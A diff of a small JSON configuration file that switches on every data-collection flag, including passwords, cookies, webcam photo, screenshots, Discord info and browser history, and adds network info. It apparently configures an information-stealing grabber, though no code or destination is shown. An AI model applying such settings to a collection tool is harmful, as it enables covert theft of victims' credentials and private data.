@@ -1,12 +1,13 @@
 {
-    "user_info": false,
-    "os_info": false,
-    "system_info": false,
-    "discord_info": false,
-    "webcam_photo": false,
-    "screenshot": false,
-    "cookies": false,
-    "password": false,
-    "browser_downloads": false,
-    "browser_history": false
+  "user_info": true,
+  "os_info": true,
+  "system_info": true,
+  "network_info": true,
+  "discord_info": true,
+  "webcam_photo": true,
+  "screenshot": true,
+  "password": true,
+  "browser_downloads": true,
+  "browser_history": true,
+  "cookies": true
 }
